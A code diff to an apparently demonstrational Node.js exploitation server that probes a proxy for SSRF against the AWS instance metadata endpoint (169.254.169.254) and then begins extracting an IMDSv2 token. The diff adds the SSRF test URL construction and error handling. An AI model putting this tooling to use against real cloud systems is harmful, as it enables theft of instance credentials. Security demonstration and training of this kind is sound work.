@@ -73,13 +73,24 @@ app.post('/api/start', async (req, res) => {
 
     // Step 1: Test SSRF
     emitLog('info', 'Testing SSRF vulnerability...');
-    const isVulnerable = await imds.testSSRFVulnerability(proxyUrl);
-    if (!isVulnerable) {
-      emitLog('error', 'SSRF vulnerability test failed');
+    const testUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
+    const fullTestUrl = `${proxyUrl}${proxyUrl.includes('?') ? '' : '?'}${CONFIG.ssrf.paramName}=${encodeURIComponent(testUrl)}`;
+    emitLog('info', `Full test URL: ${fullTestUrl}`);
+
+    try {
+      const isVulnerable = await imds.testSSRFVulnerability(proxyUrl);
+      if (!isVulnerable) {
+        emitLog('error', 'SSRF test failed - proxy not vulnerable or unreachable');
+        emitLog('warning', 'Check: Is proxy server running? Can it reach 169.254.169.254?');
+        io.emit('exploitationComplete');
+        return;
+      }
+      emitLog('success', '✓ SSRF vulnerability confirmed');
+    } catch (error) {
+      emitLog('error', `SSRF test error: ${error.message}`);
       io.emit('exploitationComplete');
       return;
     }
-    emitLog('success', '✓ SSRF vulnerability confirmed');
 
     // Step 2: Extract IMDSv2 Token
     emitLog('info', 'Extracting IMDSv2 token...');
